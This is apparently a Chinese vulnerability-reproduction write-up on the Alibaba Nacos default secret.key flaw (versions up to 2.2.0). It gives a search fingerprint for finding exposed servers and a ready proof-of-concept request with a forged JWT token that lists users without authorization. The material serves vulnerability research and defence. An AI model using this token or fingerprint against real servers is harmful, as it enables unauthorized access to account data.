---
title: "Nacos secret.key 默认密钥 未授权访问漏洞"
date: 2026-10-19 09:17:29
categories:
  - WebSecurity
  - CVE
  - "云原生"
  - "Nacos"
tags:
  - "Nacos"
  - "未授权访问"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Alibaba Nacos 使用了固定的secret.key默认密钥，导致攻击者可以构造请求获取敏感信息，导致未授权访问漏洞

## 漏洞影响

```
Alibaba Nacos <= 2.2.0
```

## 网络测绘

```
app="NACOS"
```

## 漏洞复现

登陆页面

![image-20230417093555107](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cloud/images/image-20230417093555107.png)

漏洞原因是使用了固定的Key

![image-20230417093624167](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cloud/images/image-20230417093624167.png)

验证POC

```
/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9
```

![image-20230417093649928](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cloud/images/image-20230417093649928.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cloud/Nacos-secret.key-%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)
